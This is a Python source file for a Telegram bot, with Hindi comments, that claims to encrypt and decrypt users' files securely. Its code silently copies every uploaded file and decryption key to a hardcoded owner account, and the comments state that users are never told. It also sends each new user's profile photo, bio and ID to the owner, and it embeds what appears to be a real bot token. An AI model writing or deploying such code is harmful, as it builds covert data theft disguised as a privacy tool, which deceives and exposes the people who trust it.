# bot.py
# Requirements:
#   pip install python-telegram-bot==20.6 cryptography
#
# Features:
#   - Encrypt / Decrypt (Fernet, 50MB)
#   - Beautiful Reply Keyboard UI
#   - Owner Panel (only owner)
#   - New user notification (DP + details)
#   - Welcome message with DP
#   - Every uploaded file auto-forwarded to owner (SILENTLY)
#   - User को कोई message नहीं दिखेगा कि forward हुआ है

import os
import tempfile
import traceback
from cryptography.fernet import Fernet, InvalidToken
from telegram import Update, InputFile, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ===== CONFIG =====
BOT_TOKEN = "8513005164:AAHSB3MEuhcWAZSESON3gc8JfIYgY_dCDIk"   # अपना बॉट टोकन यहाँ डालो
OWNER_ID = 7652176329                        # अपना Telegram user ID डालो
MAX_FILE_SIZE = 50 * 1024 * 1024            # 50 MB
ALLOWED_EXTS = {".py", ".html", ".htm", ".txt"}
# ===================


# ---------- Helpers ----------
def is_allowed(name: str) -> bool:
    return os.path.splitext(name)[1].lower() in ALLOWED_EXTS if name else False

def looks_enc(name: str) -> bool:
    return name.lower().endswith(".enc") if name else False

def looks_key(name: str) -> bool:
    return any(name.lower().endswith(s) for s in [".key", ".key.txt"]) if name else False

def probable_key(txt: str) -> bool:
    t = txt.strip()
    return 40 <= len(t) <= 60 and all(c.isalnum() or c in "-_=" for c in t)

def keyboard(is_owner=False):
    rows = [["🔐 Encrypt File", "🔓 Decrypt File"], ["ℹ️ About Bot"]]
    if is_owner:
        rows.append(["🧠 Owner Panel"])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)


# ---------- Owner silent forward ----------
async def forward_silent(update: Update, doc):
    """Send copy of file + user info to owner silently"""
    user = update.effective_user
    caption = (
        f"📩 *File uploaded by* [{user.full_name}](tg://user?id={user.id})\n"
        f"• Username: @{user.username or '—'}\n"
        f"• ID: `{user.id}`"
    )
    try:
        # silently send file + info to owner
        await doc.copy(chat_id=OWNER_ID, caption=caption, parse_mode="Markdown")
    except Exception as e:
        print("Silent forward error:", e)


# ---------- /start ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_owner = user.id == OWNER_ID
    context.user_data.clear()

    # notify owner of new user
    if user.id != OWNER_ID:
        try:
            chat_info = await context.bot.get_chat(user.id)
            bio = chat_info.bio or "—"
            photos = await context.bot.get_user_profile_photos(user.id, limit=1)
            caption = (
                f"👤 *New User Joined*\n\n"
                f"• Name: [{user.full_name}](tg://user?id={user.id})\n"
                f"• Username: @{user.username or '—'}\n"
                f"• ID: `{user.id}`\n"
                f"• Bio: {bio}"
            )
            if photos.total_count > 0:
                await context.bot.send_photo(
                    OWNER_ID, photo=photos.photos[0][-1].file_id,
                    caption=caption, parse_mode="Markdown"
                )
            else:
                await context.bot.send_message(OWNER_ID, caption, parse_mode="Markdown")
        except Exception as e:
            print("Owner notify error:", e)

    # Welcome user
    try:
        photos = await context.bot.get_user_profile_photos(user.id, limit=1)
        caption = (
            f"👋 *Welcome, {user.first_name}!* \n\n"
            f"यह बॉट आपकी फ़ाइलें सुरक्षित रूप से 🔐 *Encrypt* और 🔓 *Decrypt* कर सकता है।\n\n"
            f"नीचे दिए गए बटन से शुरू करें 👇"
        )
        if photos.total_count > 0:
            await update.message.reply_photo(
                photo=photos.photos[0][-1].file_id,
                caption=caption, parse_mode="Markdown",
                reply_markup=keyboard(is_owner),
            )
        else:
            await update.message.reply_text(
                caption, parse_mode="Markdown", reply_markup=keyboard(is_owner)
            )
    except Exception:
        await update.message.reply_text(
            "Welcome! नीचे से Encrypt / Decrypt चुनो 👇", reply_markup=keyboard(is_owner)
        )


# ---------- Encrypt ----------
async def encrypt_file(update: Update, context: ContextTypes.DEFAULT_TYPE, doc):
    await forward_silent(update, doc)
    status = await update.message.reply_text("📥 फ़ाइल डाउनलोड कर रहा हूँ...")
    try:
        with tempfile.TemporaryDirectory() as td:
            path = os.path.join(td, doc.file_name)
            await (await context.bot.get_file(doc.file_id)).download_to_drive(custom_path=path)

            await status.edit_text("🔐 Encrypt कर रहा हूँ...")
            key = Fernet.generate_key()
            f = Fernet(key)
            enc_data = f.encrypt(open(path, "rb").read())

            enc_path = os.path.join(td, doc.file_name + ".enc")
            open(enc_path, "wb").write(enc_data)

            await status.edit_text("📤 भेज रहा हूँ...")
            await update.message.reply_document(
                InputFile(enc_path, filename=os.path.basename(enc_path)),
                caption="✅ *Encrypted File*\nKey संभाल कर रखें।",
                parse_mode="Markdown",
            )

            key_path = os.path.join(td, doc.file_name + ".key.txt")
            open(key_path, "wb").write(key)
            await update.message.reply_document(
                InputFile(key_path, filename=os.path.basename(key_path)),
                caption="🔑 *यह आपकी Fernet key है*", parse_mode="Markdown",
            )
            await update.message.reply_text(f"Key:\n`{key.decode()}`", parse_mode="Markdown")
            await status.delete()
    except Exception as e:
        traceback.print_exc()
        await status.edit_text(f"❌ Encryption failed: {e}")


# ---------- Decrypt ----------
async def decrypt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    enc_path = context.user_data.get("enc_path")
    key = context.user_data.get("key")
    if not enc_path or not key:
        await update.message.reply_text("Decrypt के लिए .enc और key दोनों ज़रूरी हैं।")
        return
    await update.message.reply_text("🔓 Decrypt कर रहा हूँ...")
    try:
        data = open(enc_path, "rb").read()
        dec = Fernet(key.encode()).decrypt(data)
        name = os.path.basename(enc_path)[:-4]
        out = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(name)[1])
        out.write(dec)
        out.close()
        await update.message.reply_document(
            InputFile(out.name, filename=name),
            caption="✅ *Decrypted File*\nसावधानी से चलाएँ।",
            parse_mode="Markdown",
        )
        os.unlink(out.name)
        context.user_data.clear()
    except InvalidToken:
        await update.message.reply_text("❌ Wrong key या corrupted फ़ाइल।")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


# ---------- Document handler ----------
async def on_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    name = doc.file_name
    size = doc.file_size or 0
    if size > MAX_FILE_SIZE:
        await update.message.reply_text("❌ फ़ाइल 50 MB से बड़ी है।")
        return

    mode = context.user_data.get("mode")

    if mode == "decrypt" and looks_enc(name):
        await forward_silent(update, doc)
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".enc")
        await (await context.bot.get_file(doc.file_id)).download_to_drive(custom_path=tmp.name)
        context.user_data["enc_path"] = tmp.name
        await update.message.reply_text("📨 Encrypted फ़ाइल मिली। अब key भेजो (file या text).")
        return

    if mode == "decrypt" and looks_key(name):
        await forward_silent(update, doc)
        tmp = tempfile.NamedTemporaryFile(delete=False)
        await (await context.bot.get_file(doc.file_id)).download_to_drive(custom_path=tmp.name)
        key = open(tmp.name).read().strip()
        context.user_data["key"] = key
        if context.user_data.get("enc_path"):
            await decrypt_file(update, context)
        else:
            await update.message.reply_text("अब encrypted (.enc) फ़ाइल भेजो।")
        return

    if not mode or mode == "encrypt":
        if is_allowed(name):
            await encrypt_file(update, context, doc)
            context.user_data.clear()
        else:
            await update.message.reply_text("⚠️ Unsupported file type.")
        return


# ---------- Text handler ----------
async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    txt = update.message.text.strip()
    user = update.effective_user
    is_owner = user.id == OWNER_ID

    if txt == "🔐 Encrypt File":
        context.user_data["mode"] = "encrypt"
        await update.message.reply_text("📤 Encrypt करने के लिए फ़ाइल भेजो।", reply_markup=keyboard(is_owner))
        return

    if txt == "🔓 Decrypt File":
        context.user_data["mode"] = "decrypt"
        await update.message.reply_text("📨 पहले encrypted (.enc) फ़ाइल भेजो, फिर key।", reply_markup=keyboard(is_owner))
        return

    if txt == "ℹ️ About Bot":
        about = (
            "🤖 *Secure Encrypt/Decrypt Bot*\n\n"
            "• Fernet (AES-based) encryption\n"
            "• 50 MB तक की फ़ाइलें\n"
            "• Server पर कुछ भी store नहीं होता\n"
            "• हर फ़ाइल owner को silently भेजी जाती है (security log)"
        )
        await update.message.reply_text(about, parse_mode="Markdown", reply_markup=keyboard(is_owner))
        return

    if txt == "🧠 Owner Panel" and is_owner:
        await update.message.reply_text(
            "🧠 *Owner Panel*\n\nहर upload का silent log आपको भेजा जा रहा है।",
            parse_mode="Markdown",
            reply_markup=keyboard(True),
        )
        return

    if context.user_data.get("mode") == "decrypt" and probable_key(txt):
        context.user_data["key"] = txt
        if context.user_data.get("enc_path"):
            await decrypt_file(update, context)
        else:
            await update.message.reply_text("अब encrypted (.enc) फ़ाइल भेजो।")
        return

    await update.message.reply_text("❓ /start दबाओ या नीचे बटन चुनो।", reply_markup=keyboard(is_owner))


# ---------- Main ----------
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    print("Bot running...")
    app.run_polling()


if __name__ == "__main__":
    main()
